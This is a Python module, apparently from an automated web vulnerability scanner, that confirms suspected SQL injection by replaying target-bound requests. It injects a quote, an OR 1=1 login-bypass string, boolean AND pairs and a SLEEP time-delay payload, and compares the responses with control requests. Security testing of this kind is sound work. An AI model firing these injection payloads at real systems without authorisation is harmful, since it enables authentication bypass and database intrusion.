"""Deterministic, repeated SQL-injection proof over exact target-bound requests."""

from __future__ import annotations

from dataclasses import replace
import hashlib
import json
import math
import re
import time
from typing import Any, Mapping
import urllib.parse

try:
    from capabilities.request_mutation import (
        RequestMutationVerificationError,
        replace_private_request_field,
    )
    from hunt.capability_executor import CapabilityAdapterResult, Cancelled, Heartbeat
    from runtime.capability_registry import CapabilitySpec
    from runtime.models import TargetBinding
    from runtime.request_replay_executor import ReplayTransport, ReplayTransportResult
except ModuleNotFoundError:
    from .request_mutation import (
        RequestMutationVerificationError,
        replace_private_request_field,
    )
    from ..hunt.capability_executor import CapabilityAdapterResult, Cancelled, Heartbeat
    from ..runtime.capability_registry import CapabilitySpec
    from ..runtime.models import TargetBinding
    from ..runtime.request_replay_executor import ReplayTransport, ReplayTransportResult

try:
    from scanner_tools.request_replay import ReplayRequest
except ModuleNotFoundError:
    from scanner.scanner_tools.request_replay import ReplayRequest


SQLI_PROOF_PARSER_VERSION = "sqli-proof/v1"
_SQL_ERROR_PATTERNS = tuple(re.compile(pattern, re.IGNORECASE) for pattern in (
    r"you have an error in your sql syntax",
    r"warning.{0,40}mysql",
    r"unclosed quotation mark after the character string",
    r"postgresql.{0,40}(?:error|exception)",
    r"pg_query\(\)",
    # SQLITE_ERROR is the constant SQLite itself emits, and the separator was
    # not optional: the pattern matched "sqlite3_exception" but not the far more
    # common "SQLITE_ERROR", so an error-based injection that reproduced its
    # differential twice was still withheld for want of a signature.
    r"sqlite(?:3)?[ _-]?(?:error|exception)",
    r"ora-\d{4,5}",
    r"sqlstate\[[0-9a-z]+\]",
    r"syntax error.{0,80}(?:sql|query|database)",
))
_SECRET_RE = re.compile(
    r"(?i)(password|passwd|secret|token|authorization|cookie)\s*[:=]\s*[^\s,;<]{1,200}"
)


class SQLiProofError(ValueError):
    """A SQLi proof request does not match immutable candidate authority."""


def _sha256(value: bytes) -> str:
    return hashlib.sha256(value).hexdigest()


def _signatures(result: ReplayTransportResult) -> tuple[str, ...]:
    text = result.response_body[:2_000_000].decode("utf-8", errors="replace")
    return tuple(pattern.pattern for pattern in _SQL_ERROR_PATTERNS if pattern.search(text))


def _excerpt(result: ReplayTransportResult) -> str | None:
    text = result.response_body[:2_000_000].decode("utf-8", errors="replace")
    match = next((pattern.search(text) for pattern in _SQL_ERROR_PATTERNS if pattern.search(text)), None)
    if match is None:
        return None
    start = max(0, match.start() - 80)
    sample = " ".join(text[start:match.end() + 160].split())[:400]
    return _SECRET_RE.sub(lambda item: f"{item.group(1)}=[REDACTED]", sample)


def _replace_query_field(
    request: ReplayRequest, *, field_path: str, replacement: str,
) -> ReplayRequest:
    parsed = urllib.parse.urlsplit(request.url)
    pairs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    matches = [index for index, (name, _value) in enumerate(pairs) if name == field_path]
    if len(matches) != 1:
        raise SQLiProofError("query candidate field authority is ambiguous")
    index = matches[0]
    pairs[index] = (pairs[index][0], replacement)
    return replace(request, url=urllib.parse.urlunsplit((
        parsed.scheme, parsed.netloc, parsed.path,
        urllib.parse.urlencode(pairs, doseq=True), "",
    )))


def _field_value(request: ReplayRequest, field_path: str) -> str:
    parsed = urllib.parse.urlsplit(request.url)
    values = [value for name, value in urllib.parse.parse_qsl(
        parsed.query, keep_blank_values=True,
    ) if name == field_path]
    if len(values) == 1:
        return values[0]
    return ""


def _mutate(request: ReplayRequest, field_path: str, replacement: str) -> ReplayRequest:
    if request.method in {"GET", "HEAD", "OPTIONS"}:
        return _replace_query_field(request, field_path=field_path, replacement=replacement)
    try:
        mutated, _encoding = replace_private_request_field(
            request, field_path=field_path, replacement=replacement,
        )
    except RequestMutationVerificationError as exc:
        raise SQLiProofError(str(exc)) from exc
    return mutated


def _identity_signal(result: ReplayTransportResult) -> tuple[str, ...]:
    signals = {
        name.lower() for name in result.response_headers
        if name.lower() in {"set-cookie", "authorization", "x-auth-token"}
    }
    content_type = next((
        str(value).lower() for name, value in result.response_headers.items()
        if str(name).lower() == "content-type"
    ), "")
    if "json" in content_type and result.response_body:
        try:
            document = json.loads(result.response_body.decode("utf-8"))
        except (UnicodeDecodeError, json.JSONDecodeError):
            document = None

        def walk(value: Any, path: tuple[str, ...] = ()) -> None:
            if isinstance(value, Mapping):
                for raw_name, child in value.items():
                    name = str(raw_name).lower()
                    child_path = (*path, name)
                    if (
                        name in {"token", "access_token", "id_token", "jwt"}
                        and isinstance(child, str) and child.strip()
                    ):
                        signals.add("json:" + ".".join(child_path))
                    walk(child, child_path)
            elif isinstance(value, list):
                for child in value[:20]:
                    walk(child, path)

        walk(document)
    return tuple(sorted(signals))


class SQLiProofAdapter:
    """Require two matching reproductions before emitting verified SQLi proof."""

    # CapabilityExecutor checks these against the registry before it runs an
    # adapter. Without them every execution raised AttributeError, so the proof
    # escalation that promotes a suspected SQLi to verified never ran at all.
    capability_name = "sqli.prove_batch"
    adapter_name = "sqli.proof_batch"
    adapter_version = "1"
    manages_cancellation = True

    def __init__(
        self, *, specification: CapabilitySpec, target: TargetBinding,
        request: ReplayRequest, candidate: Mapping[str, Any],
        transport: ReplayTransport, requested_budget: Mapping[str, int],
    ) -> None:
        if specification.name != "sqli.prove_batch":
            raise SQLiProofError("SQLi proof capability is invalid")
        if int(requested_budget.get("http_requests") or 0) < 4:
            raise SQLiProofError("SQLi proof requires at least four HTTP requests")
        if request.method not in {"GET", "HEAD", "OPTIONS"} and int(
            requested_budget.get("state_changing_requests") or 0
        ) < int(requested_budget.get("http_requests") or 0):
            raise SQLiProofError(
                "body SQLi proof requires a conservative mutation reservation"
            )
        if str(candidate.get("method") or "").upper() != request.method:
            raise SQLiProofError("SQLi proof request method differs from candidate")
        request_ref = str(candidate.get("request_ref_id") or "")
        if request_ref and request_ref != request.request_id:
            raise SQLiProofError("SQLi proof private request reference differs")
        field = str(candidate.get("field_path") or candidate.get("parameter_name") or "")
        if not field:
            raise SQLiProofError("SQLi proof candidate has no exact field")
        self.specification = specification
        self.target = target
        self.request = request
        self.candidate = dict(candidate)
        self.transport = transport
        self.requested_budget = {str(k): int(v) for k, v in requested_budget.items()}
        self.field = field

    async def execute(self, *, heartbeat: Heartbeat, cancelled: Cancelled) -> CapabilityAdapterResult:
        started = time.monotonic()
        attempted = 0
        results: list[ReplayTransportResult] = []

        async def send(request: ReplayRequest) -> ReplayTransportResult:
            nonlocal attempted
            if cancelled():
                raise SQLiProofError("cancelled")
            remaining = max(1, self.requested_budget["http_requests"] - attempted)
            wall = max(1, int(self.requested_budget.get("tool_wall_seconds") or 1))
            result = await self.transport.send(
                request, target=self.target,
                timeout_seconds=max(0.5, min(15.0, wall / remaining)),
                follow_redirects=False,
            )
            attempted += 1
            results.append(result)
            await heartbeat()
            return result

        original = _field_value(self.request, self.field)
        invalid = f"shakerscan_invalid_{str(self.candidate.get('candidate_id') or '')[:12]}"
        request_class = str(self.candidate.get("request_class") or "safe_read")
        control_request = (
            _mutate(self.request, self.field, invalid)
            if request_class == "safe_authentication" else self.request
        )
        error_request = _mutate(self.request, self.field, f"{original}'")
        try:
            pairs = [(await send(control_request), await send(error_request)) for _ in range(2)]
            control_signatures = [set(_signatures(control)) for control, _payload in pairs]
            payload_signatures = [set(_signatures(payload)) for _control, payload in pairs]
            repeated_error = set.intersection(*payload_signatures) - set.union(*control_signatures)
            proof_contract = None
            technique = None
            proof_pairs = pairs
            if repeated_error and all(
                not control.error_code and not payload.error_code
                for control, payload in pairs
            ):
                proof_contract = "sqli_error_differential/v2"
                technique = "error_based_repeated"
            elif request_class == "safe_authentication":
                injection = _mutate(self.request, self.field, "' OR 1=1-- ")
                auth_pairs = [(await send(control_request), await send(injection)) for _ in range(2)]
                if all(
                    not control.error_code and not payload.error_code
                    and not _identity_signal(control)
                    and bool(_identity_signal(payload))
                    and (
                        control.status_code != payload.status_code
                        or _sha256(control.response_body) != _sha256(payload.response_body)
                    )
                    for control, payload in auth_pairs
                ):
                    proof_contract = "sqli_authentication_bypass/v1"
                    technique = "authentication_bypass_repeated"
                    proof_pairs = auth_pairs
            else:
                true_request = _mutate(self.request, self.field, f"{original}' AND '1'='1")
                false_request = _mutate(self.request, self.field, f"{original}' AND '1'='2")
                boolean_pairs = [(await send(true_request), await send(false_request)) for _ in range(2)]
                signatures = [(
                    item[0].status_code, len(item[0].response_body), _sha256(item[0].response_body),
                    item[1].status_code, len(item[1].response_body), _sha256(item[1].response_body),
                ) for item in boolean_pairs]
                if signatures[0] == signatures[1] and signatures[0][:3] != signatures[0][3:]:
                    proof_contract = "sqli_boolean_differential/v1"
                    technique = "boolean_pair_repeated"
                    proof_pairs = boolean_pairs
                elif self.requested_budget["http_requests"] - attempted >= 6:
                    # Time proof is deliberately last: it is slower, and verification
                    # requires three controls and three payloads rather than one delay.
                    time_payload = str(
                        self.candidate.get("time_payload")
                        or f"{original}' AND SLEEP(1)-- "
                    )
                    delay_request = _mutate(
                        self.request, self.field, time_payload,
                    )
                    timing_pairs = [
                        (await send(control_request), await send(delay_request))
                        for _ in range(3)
                    ]
                    control_ms = sorted(pair[0].elapsed_ms for pair in timing_pairs)
                    payload_ms = sorted(pair[1].elapsed_ms for pair in timing_pairs)
                    if (
                        all(not left.error_code and not right.error_code for left, right in timing_pairs)
                        and payload_ms[1] - control_ms[1] >= 750
                        and payload_ms[0] - control_ms[2] >= 500
                    ):
                        proof_contract = "sqli_time_differential/v1"
                        technique = "time_median_repeated"
                        proof_pairs = timing_pairs
        except SQLiProofError as exc:
            status = "cancelled" if str(exc) == "cancelled" else "blocked"
            return CapabilityAdapterResult(
                status=status, errors=(str(exc),), execution_started=bool(attempted),
                actual_budget={
                    "http_requests": attempted,
                    **({"state_changing_requests": attempted}
                       if self.request.method not in {"GET", "HEAD", "OPTIONS"} else {}),
                    "tool_wall_seconds": max(1, math.ceil(time.monotonic() - started)),
                },
                partial=bool(attempted), parser_version=SQLI_PROOF_PARSER_VERSION,
            )

        verified = proof_contract is not None
        hashes = [{
            "control_request_sha256": control_request.digest_dict()["body_sha256"] if control_request.body else _sha256(control_request.url.encode()),
            "control_response_sha256": _sha256(control.response_body),
            "payload_response_sha256": _sha256(payload.response_body),
            "control_status": control.status_code,
            "payload_status": payload.status_code,
        } for control, payload in proof_pairs]
        observation = {
            "kind": "sqli_proof",
            # The route is already value-free immutable manifest content, and a
            # verified injection that cannot say where it is is not actionable.
            "canonical_path": self.candidate.get("canonical_path"),
            "candidate_id": self.candidate.get("candidate_id"),
            "request_ref_id": self.candidate.get("request_ref_id"),
            "method": self.request.method,
            "field_path": self.field,
            "request_class": request_class,
            "proof_state": "verified" if verified else "not_proven",
            "finding_verdict": "verified" if verified else "not_proven",
            "proof_contract": proof_contract,
            "technique": technique,
            "repetitions": 2,
            "response_pairs": hashes,
            "database_error_signatures": sorted(repeated_error) if 'repeated_error' in locals() else [],
            "redacted_excerpt": _excerpt(proof_pairs[0][1]) if verified and technique == "error_based_repeated" else None,
            "session_state_discarded": request_class == "safe_authentication",
            "secret_values_visible": False,
        }
        errors = tuple(item.error_code for item in results if item.error_code)
        return CapabilityAdapterResult(
            status="partial" if errors else "success", observations=(observation,), errors=errors,
            actual_budget={
                "http_requests": attempted,
                **({"state_changing_requests": attempted}
                   if self.request.method not in {"GET", "HEAD", "OPTIONS"} else {}),
                "tool_wall_seconds": max(1, math.ceil(time.monotonic() - started)),
            },
            partial=bool(errors), timed_out=any(item.timed_out for item in results),
            execution_started=True, parser_version=SQLI_PROOF_PARSER_VERSION,
            redacted_execution={
                "candidate_id": self.candidate.get("candidate_id"),
                "request_ref_id": self.candidate.get("request_ref_id"),
                "method": self.request.method, "field_path": self.field,
                "proof_contract": proof_contract, "secret_values_visible": False,
            },
        )


__all__ = ["SQLI_PROOF_PARSER_VERSION", "SQLiProofAdapter", "SQLiProofError"]
